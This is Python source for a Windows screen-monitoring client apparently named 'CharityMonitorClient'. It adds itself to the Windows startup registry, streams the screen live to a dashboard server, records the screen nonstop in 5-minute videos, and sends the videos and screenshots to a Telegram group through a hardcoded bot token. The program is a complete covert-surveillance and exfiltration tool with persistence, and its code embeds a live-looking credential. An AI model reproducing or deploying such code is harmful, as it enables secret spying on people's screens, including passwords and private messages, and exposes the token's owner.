import socketio
import mss
import time
import socket
import platform
import base64
import io
import psutil
from PIL import Image
import cv2
import numpy as np
import os
import threading
import asyncio
import logging
import sys
import winreg
from telegram import Bot

# Setup logging to file
logging.basicConfig(
    filename='monitor_log.txt',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# --- CONFIGURATION ---
SERVER_URL = "http://localhost:5000" 
TELEGRAM_BOT_TOKEN = "8707428358:AAGXk3xFxWRhIn7wfu2pQ05jmj0XqZzOUPs"
TELEGRAM_GROUP_ID = "-1003986140793"
VIDEO_DURATION = 300  # 5 minutes as requested
# ---------------------

sio = socketio.Client()
force_upload_event = threading.Event()

def get_system_info():
    try:
        ram = round(psutil.virtual_memory().total / (1024**3), 1)
    except:
        ram = "Unknown"
    return f"{platform.system()} {platform.release()} | {ram}GB RAM"

@sio.event
def connect():
    print("Connected to Dashboard Server")
    logging.info("Connected to Dashboard Server")
    try:
        ip_addr = socket.gethostbyname(socket.gethostname())
    except:
        ip_addr = "Unknown"
    sio.emit('register', {
        'name': socket.gethostname(),
        'ip': ip_addr,
        'specs': get_system_info()
    })
    # Send startup notification to Telegram
    asyncio.run(send_status_to_telegram(f"🚀 Monitoring started on {socket.gethostname()}"))

async def send_status_to_telegram(message):
    try:
        chat_id = TELEGRAM_GROUP_ID
        if isinstance(chat_id, str) and (chat_id.startswith('-') or chat_id.isdigit()):
            chat_id = int(chat_id)
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        async with bot:
            await bot.send_message(chat_id=chat_id, text=message)
    except Exception as e:
        logging.error(f"Failed to send status to Telegram: {e}")

def add_to_startup():
    """Adds the current executable to Windows Startup via Registry."""
    try:
        # Get path of current executable
        # When running as .exe (PyInstaller), sys.executable is the .exe path
        # When running as .py, it's the python interpreter path (we handle this for testing)
        file_path = os.path.realpath(sys.executable)
        
        # Open the Run key in Registry
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "CharityMonitorClient", 0, winreg.REG_SZ, file_path)
        logging.info(f"Successfully added to startup: {file_path}")
    except Exception as e:
        logging.error(f"Error adding to startup: {e}")

@sio.event
def force_upload(data):
    print("Force upload requested from dashboard")
    force_upload_event.set()

@sio.event
def force_screenshot(data):
    print("Force screenshot requested from dashboard")
    threading.Thread(target=take_and_send_screenshot, daemon=True).start()

def take_and_send_screenshot():
    try:
        filename = f"screenshot_{int(time.time())}.jpg"
        with mss.MSS() as sct:
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
            img.save(filename, "JPEG", quality=85)
            
        asyncio.run(send_photo_to_telegram(filename))
    except Exception as e:
        logging.error(f"Error taking screenshot: {e}")

async def send_photo_to_telegram(file_path):
    try:
        logging.info(f"Attempting to upload screenshot {file_path} to Telegram...")
        
        chat_id = TELEGRAM_GROUP_ID
        if isinstance(chat_id, str) and (chat_id.startswith('-') or chat_id.isdigit()):
            chat_id = int(chat_id)

        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        async with bot:
            with open(file_path, 'rb') as photo:
                await bot.send_photo(
                    chat_id=chat_id, 
                    photo=photo, 
                    caption=f"Manual Screenshot: {socket.gethostname()}"
                )
        
        logging.info(f"Screenshot successfully sent to Telegram: {file_path}")
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        logging.error(f"Telegram photo upload error: {e}")

def stream_screen():
    with mss.MSS() as sct:
        while True:
            if sio.connected:
                try:
                    monitor = sct.monitors[1]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    img.thumbnail((800, 450))
                    buffer = io.BytesIO()
                    img.save(buffer, format="JPEG", quality=40)
                    frame_b64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
                    sio.emit('screen_frame', {'frame': frame_b64})
                except Exception as e:
                    print(f"Streaming error: {e}")
            time.sleep(0.5)

async def send_to_telegram(file_path):
    try:
        msg = f"Attempting to upload {file_path} to Telegram..."
        print(msg)
        logging.info(msg)
        
        # Ensure chat_id is an integer if it starts with -
        chat_id = TELEGRAM_GROUP_ID
        if isinstance(chat_id, str) and (chat_id.startswith('-') or chat_id.isdigit()):
            chat_id = int(chat_id)

        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        async with bot:
            # Verify bot connection
            me = await bot.get_me()
            logging.info(f"Bot verified: {me.username}")
            
            with open(file_path, 'rb') as video:
                await bot.send_video(
                    chat_id=chat_id, 
                    video=video, 
                    caption=f"Activity Log: {socket.gethostname()}",
                    write_timeout=180, # Increased for 5-minute videos
                    read_timeout=180
                )
        
        success_msg = f"Video successfully sent to Telegram: {file_path}"
        print(success_msg)
        logging.info(success_msg)
        
        if os.path.exists(file_path):
            os.remove(file_path)
            logging.info(f"Deleted local file: {file_path}")
    except Exception as e:
        err_msg = f"Telegram error: {str(e)}"
        print(err_msg)
        logging.error(err_msg)

def record_video():
    logging.info("Recording thread started.")
    while True:
        try:
            filename = f"record_{int(time.time())}.mp4"
            logging.info(f"Starting new recording: {filename}")
            
            with mss.MSS() as sct:
                monitor = sct.monitors[1]
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                fps = 5.0
                out = cv2.VideoWriter(filename, fourcc, fps, (1280, 720))
                
                if not out.isOpened():
                    logging.error(f"Failed to open VideoWriter for {filename}")
                    time.sleep(10)
                    continue

                start_time = time.time()
                frames_captured = 0
                last_emit_time = 0
                
                while time.time() - start_time < VIDEO_DURATION:
                    current_elapsed = time.time() - start_time
                    remaining = int(VIDEO_DURATION - current_elapsed)
                    
                    # Emit progress once per second
                    if int(current_elapsed) > last_emit_time:
                        if sio.connected:
                            sio.emit('recording_progress', {'remaining': remaining})
                        last_emit_time = int(current_elapsed)

                    if force_upload_event.is_set():
                        logging.info("Force upload event detected. Finalizing current video early.")
                        force_upload_event.clear()
                        break
                    
                    try:
                        sct_img = sct.grab(monitor)
                        frame = np.array(sct_img)
                        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                        frame = cv2.resize(frame, (1280, 720))
                        out.write(frame)
                        frames_captured += 1
                        time.sleep(1/fps)
                    except Exception as e:
                        logging.error(f"Error capturing frame: {e}")
                        time.sleep(1)
                
                out.release()
                
                if frames_captured > 0 and os.path.exists(filename) and os.path.getsize(filename) > 0:
                    logging.info(f"Finished recording: {filename} ({frames_captured} frames, {os.path.getsize(filename)} bytes)")
                    try:
                        asyncio.run(send_to_telegram(filename))
                    except Exception as e:
                        logging.error(f"Failed to trigger send_to_telegram: {e}")
                else:
                    logging.error(f"Recording failed or empty: {filename}. Captured {frames_captured} frames.")
                    if os.path.exists(filename):
                        os.remove(filename)
                        
        except Exception as e:
            logging.error(f"Critical error in record_video loop: {e}")
            time.sleep(10)

if __name__ == '__main__':
    # Add to Windows Startup
    add_to_startup()
    
    # Start background threads
    threading.Thread(target=record_video, daemon=True).start()
    
    while True:
        try:
            if not sio.connected:
                print(f"Attempting to connect to {SERVER_URL}...")
                sio.connect(SERVER_URL)
            stream_screen()
        except Exception as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
